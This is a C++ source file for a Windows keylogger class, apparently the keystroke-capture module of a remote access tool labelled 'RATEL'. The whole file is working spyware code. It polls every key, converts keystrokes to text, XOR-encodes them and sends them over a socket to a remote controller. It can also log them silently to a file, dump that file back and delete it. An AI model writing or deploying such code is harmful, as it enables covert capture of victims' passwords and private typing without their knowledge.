
#include "../inc/Keylogger.h"
#include "../inc/other.h"
#include "../inc/ErrorCodes.h"


Keylogger::Keylogger()
{
    ;
}


VOID Keylogger::setup()
{
    wcout << "setup called " <<endl;
    DWORD dwProcessId;
    a_WindowHandle =  GetForegroundWindow(); //Récupère un handle vers la fenêtre de premier plan
    a_dwThreadId = GetWindowThreadProcessId(a_WindowHandle, &dwProcessId); //Récupère l'identifiant du thread qui a créé la fenêtre spécifiée
    a_hkl = GetKeyboardLayout(a_dwThreadId); //Récupère l'identificateur de paramètres régionaux d'entrée actif (anciennement appelé disposition du clavier).
}


VOID Keylogger::setSocket(SOCKET &sock)
{
    a_sock = sock;
}


VOID Keylogger::setPathLogFile()
{

    WCHAR buff[MAX_PATH]={0};

    wcout << "\n\n\n-1-1-1--1-----\nIn setPathLogFile: " << endl;
    if(GetFullPathNameW(a_path_log_file.c_str(), MAX_PATH, buff, NULL) != 0)
    {
        //if not error:
        a_path_log_file = buff;
    }
    wcout << "Final path: " << a_path_log_file << endl;
    wcout << "getLasteroor setPathLogFile: " << GetLastError() <<"\n\n"<< endl;
}


wstring Keylogger::specialKey(INT &keystroke)
{
    switch(keystroke)
    {
    //http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
    case VK_SPACE:
        return L" ";
        
    case VK_SHIFT:
        return L"[SHIFT]";
                                                    
    case VK_RETURN:
        wcout << "reuturn vk" << endl;
        return L"\n";
    case VK_BACK:
        return L"[BACKSPACE]";
        
    case VK_TAB:
        return L"[TAB]";
        
    case VK_CONTROL:
        return L"[CTRL]";
            
    case VK_DELETE:
        return L"[DEL]";
        
    case VK_OEM_1:
        return L"[;:]";
        
    case VK_OEM_2:
        return L"[/?]";
        
    case VK_OEM_3:
        return L"[`~]";
        
    case VK_OEM_4:
        return L"[ [{ ]";
            
    case VK_OEM_5:
        return L"[\\|]";
                                        
    case VK_OEM_6:
        return L"[ ]} ]";
        
    case VK_OEM_7:
        return L"['\"]";
        
    case VK_OEM_PLUS:
        return L"[=+]";
        
    case VK_OEM_COMMA:
        return L"[,<]";
        
    case VK_OEM_MINUS:
        return L"[-_]";
        
    case VK_OEM_PERIOD:
        return(L"[.>]");
        
    case VK_NUMPAD0:
        return L"0";
        
    case VK_NUMPAD1:
        return L"1";
        
    case VK_NUMPAD2:
        return L"2";
        
    case VK_NUMPAD3:
        return L"3";
        
    case VK_NUMPAD4:
        return L"4";
        
    case VK_NUMPAD5:
        return L"5";
        
    case VK_NUMPAD6:
        return L"6";
        
    case VK_NUMPAD7:
        return L"7";
        
    case VK_NUMPAD8:
        return L"8";
        
    case VK_NUMPAD9:
        return L"9";
        
    case VK_CAPITAL:
        return L"[CAPS LOCK]";
        
    case VK_PRIOR:
        return L"[PAGE UP]";
        
    case VK_NEXT:
        return L"[PAGE DOWN]";
        
    case VK_END:
        return L"[END]";
        
    case VK_HOME:
        return L"[HOME]";
        
    case VK_LWIN:
        return L"[WIN]";
        
    case VK_RWIN:
        return L"[WIN]";
        
    case VK_VOLUME_MUTE:
        return L"[SOUND-MUTE]";
        
    case VK_VOLUME_DOWN:
        return L"[SOUND-DOWN]";
        
    case VK_VOLUME_UP:
        return L"[SOUND-DOWN]";
        
    case VK_MEDIA_PLAY_PAUSE:
        return L"[MEDIA-PLAY/PAUSE]";
        
    case VK_MEDIA_STOP:
        return L"[MEDIA-STOP]";
        
    case VK_MENU:
        return L"[ALT]";
    
    default:
        return L""; //If the key and unknown or uninteresting 
    }
}


wstring Keylogger::intToUnicode(INT keystroke)
{
    BYTE kState[256]={0};
    WCHAR uni_key[16]={0};
    UINT virtual_key = keystroke;

    GetKeyboardState(kState); //Copie l'état des 256 clés virtuelles dans le tampon spécifié.
    
    ToUnicodeEx(virtual_key, keystroke, kState, uni_key, 32, 0, a_hkl);

    return (wstring) uni_key;
}


INT Keylogger::directTcp()
{
    INT error_codes = 0;

    HANDLE threads[1];

    wcout << "In directTcp " << endl;

    threads[0] = CreateThread(NULL,0 ,sendKeystrokeThread ,this ,0 ,NULL); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
    threads[1] = CreateThread(NULL,0 ,recvDataThread ,this ,0 ,NULL);
    if(threads[0] == NULL)
    {
        error_codes = RATEL_ERROR_THREAD_SENDKEY;
    }
    if(threads[1] == NULL)
    {
        error_codes = RATEL_ERROR_THREAD_RECVDATA;
    }
    WaitForSingleObject(threads[1], INFINITE);
  
    wcout << "stat directSendKeystrokeRunning: " << directSendKeystrokeRunning << endl;
    directSendKeystrokeRunning = FALSE; // kill  sendKeystrokeThread theard.

    CloseHandle(threads[0]);
    CloseHandle(threads[1]);

    return error_codes;
}


DWORD WINAPI Keylogger::sendKeystrokeThread (LPVOID param) 
{
    Keylogger* This = (Keylogger *) param;
    This->directSendKeystroke();
    return 0;
}


VOID Keylogger::directSendKeystroke() //for directTcp
{   
    wstring unicode_char;
    directSendKeystrokeRunning = TRUE;
    INT status=0;

    wcout <<"in directSendKeystroke"  << endl;

    HANDLE hFile = silenciousCreateFile(NULL);
    if(hFile == NULL)
    {
        wcout << "\n\nfatal error in direcsendKeystroke !\n\n" << endl;
    }
    else
    {

        while (directSendKeystrokeRunning)
        {
            Sleep(20);
        
            for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
            {
                if(GetAsyncKeyState(keystroke) == -32767)
                {
                    wcout << keystroke << endl;
                    if((keystroke>=39)&&(keystroke<91))
                    {
                        //not SpecialKey
                        unicode_char = intToUnicode(keystroke);
                    }
                    else
                    {
                        unicode_char = specialKey(keystroke);
                    }
                    wcout << unicode_char << endl;
                    wcout << directSendKeystrokeRunning << endl;
                    status = send(a_sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
                    if(status == SOCKET_ERROR)
                    {
                        wcout << "\nerror in socket ...\n" << endl;
                        wcout << GetLastError() << endl;
                        directSendKeystrokeRunning = FALSE;

                    } 
                }
            }
        }
        CloseHandle(hFile);
    
    }
    wcout << "stop while directSendKeystrokeRunning" << endl;
}


DWORD WINAPI Keylogger::recvDataThread(LPVOID param)
{
    Keylogger* This = (Keylogger *) param;
    This->directRecvData();
    return 0;
}


VOID Keylogger::directRecvData()//waits to receive an end-of-connection message  for directTcp | for directTcp
{
    WCHAR buff[512]={0};
    INT status;
    while(TRUE)
    {
        status = recv(a_sock, (CHAR *)buff, sizeof(buff), 0);
        if(status == SOCKET_ERROR)
        {
            wcout << "SOCKET_ERROR" << endl;
            break;
        }
        else if (XOREncryption((wstring) buff) == L"\r\n")
        {
            break;
        }
        wcout << buff << endl;

        ZeroMemory(&buff, sizeof(buff));
    }
    wcout << "stop thread baby !" << endl;
}

//-------------------------------------------------------------------------------------------------------------------

INT Keylogger::silenciousStop()//return 1 if error
{
    /*returns 0 if the method is well executed.
    returns 1 if the silencious thread is not started. 
    */
   if(!silenciousBackgroundRunning)
   {
        //silencious thread is not started. 
        return 1;   
   }

    silenciousBackgroundRunning = FALSE;
    return 0;
}


INT Keylogger::silenciousStart()//return 1 if error
{
    /*
    Algo:
    1- (silenciousCreateFile)
        1.1- Test if exist.
        1.2- Set handle of the a_file_name.
        1.3- Hide a_file_name.
    2- (silenciousThread) Start thread.
        2.1- (silenciousKeyboardListeningAndWriteFile)
            2.1.1- (silenciousWriteKeystrokeInFile)
    */

       //if error. If the file does not exist 
    DWORD status_error_codes;
    if(silenciousCreateFile(&status_error_codes) == NULL)
    {
        wcout << "Fata; error in silencipiStart" << endl;
        wcout << "status_error_codes:" << status_error_codes << endl;
        if(status_error_codes == ERROR_ACCESS_DENIED)
        {
            wcout << "error access denied baby !!" << endl; //TO test
        }
        return 1; // Fatal error
    }
    else //To delete
    {
        wcout << "file create insilenciousStart... ";
    }

    setPathLogFile();

    HANDLE hThread  = CreateThread(NULL, 0, silenciousThread ,this ,0 ,NULL);
    return 0;
}

INT Keylogger::silenciousClean()
{
    if(a_path_log_file.empty())
    {
        return 1; //error
    }
    if(DeleteFileW(a_path_log_file.c_str()) == 0)
    {
        wcout << "error delete log file: " << GetLastError() << endl;
        /*
        if(GetLastError() == ERROR_SHARING_VIOLATION && silenciousBackgroundRunning)
        {
            return  101;//RATEL_ERROR_FILE_MANIPULATION;
        }
        */
        return 1;//error
    }
    else
    {
        
        return 0;
    }
}


DWORD WINAPI Keylogger::silenciousThread(LPVOID param) //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
{
    Keylogger* This = (Keylogger *) param;
    This->silenciousKeyboardListeningAndWriteFile();

    return 0;
}


VOID Keylogger::silenciousKeyboardListeningAndWriteFile()
{
    HANDLE hFile = silenciousCreateFile(NULL);

    wstring unicode_char;
    silenciousBackgroundRunning = TRUE;
    if(hFile != NULL)
    {
        while(silenciousBackgroundRunning)
        {  
            for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
            {
                if(GetAsyncKeyState(keystroke) == -32767)
                {
                    //if press key
                    cout << keystroke << endl;
                    if((keystroke>=39)&&(keystroke<91))
                    {
                        //not SpecialKey
                        unicode_char = intToUnicode(keystroke);
                    }
                    else
                    {
                        unicode_char = specialKey(keystroke);
                    }
                    //wcout << "char: "<<unicode_char << endl;
                    silenciousWriteKeystrokeInFile(unicode_char, hFile);
                }
            }
        }
    }
}


HANDLE Keylogger::silenciousCreateFile(DWORD *ERROR_CODES) //return NULL if error  
{   
    HANDLE hFile;
    BOOL status; 
    DWORD dwBytesWritten = 0; 
    DWORD dwDesiredAccess;
    DWORD dwCreationDisposition; 
    wcout << "silenciousCreateFile: " << endl; 
    if(checkIfFileExist((wstring)a_path_log_file))
    {
        //if exist
        wcout << "[+] file exist.\n" << endl;
        dwCreationDisposition = OPEN_ALWAYS; // Opens a file, always.
    }
    else
    {
        //file not exist
        wcout << "[-] File not  exist" << endl;
        dwCreationDisposition = CREATE_NEW;
    }


    hFile = CreateFileW(a_path_log_file.c_str(),  (GENERIC_READ | FILE_APPEND_DATA) , (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 
    wcout << "last error createfile: " << GetLastError() << endl;
    wcout << "CreateFile hFile: " << hFile << endl; 
    
    if(hFile == INVALID_HANDLE_VALUE)
    {
        //fatal error
        wcout << "FATAL ERROR in createHideFileAndHideFile: "<< GetLastError() << endl;
        if(ERROR_CODES != NULL){*ERROR_CODES = GetLastError();}
        return NULL;
    }
    
    else
    {
        if(ERROR_CODES != NULL){*ERROR_CODES = 0;}
        return hFile;
    }
}


VOID Keylogger::silenciousWriteKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile)
{
    WriteFile(          //https://stackoverflow.com/questions/28618715/c-writefile-unicode-characters
        hFile,           // open file handle
        ConvertWideToUtf8(keystroke).c_str(), // start of data to write
        keystroke.length(),  // number of bytes to write
        NULL, // number of bytes that were written
        NULL);           // no overlapped structure
    wcout << "write file good or not ? "<< GetLastError() << endl;
}


vector <string> Keylogger::dumpAllData()
{
    wcout <<"\n\n\nsilenciousCreateFile:" << endl;
    //returns all the data from the keylogger write file.
    //If the Handle is not of efinite size then checkIfFileExist is called.
    
    if(!checkIfFileExist(a_path_log_file))
    //If checkIfFileExist fails then the silent functionCreateFileAndHideFile is called.
    {
       return vector<string>(); // retourn vector empty if error
    }

    HANDLE hFile = silenciousCreateFile(NULL);

    if(hFile == NULL)
    {   //if it is impossible to return the handle
        wcout << "if it is impossible to create the log file" << endl;
        return vector<string>(); // retourn vector empty if error
    }
    
    vector <string> result;
    char chBuff[50]={0};
    DWORD dwRead;

    while(TRUE) //Read buffer of anonymous pipe and append the result in result_of_command
    {
        if(!ReadFile(hFile, &chBuff, sizeof(chBuff) ,&dwRead,NULL))
        {
            wcout << " readFromPipe Error in read pipe childen out" << endl;
            break;
        }
        if(dwRead == 0)
        {
            break;
        }
        //wcout << "dwRead: " << dwRead << endl;
        //wcout <<"2: "<< ConvertUtf8ToWide((string) chBuff) << endl;
        Sleep(20);
       // wcout << GetLastError() << endl;
       // wcout << "I: " << i << endl;
        result.push_back((string) chBuff);
    }

    CloseHandle(hFile);
    return result;
}

//-------------------------------------------------------------------------------------------------------------------
Keylogger::~Keylogger()
{
    ;
}
//----------------------------------------------------------------------------------
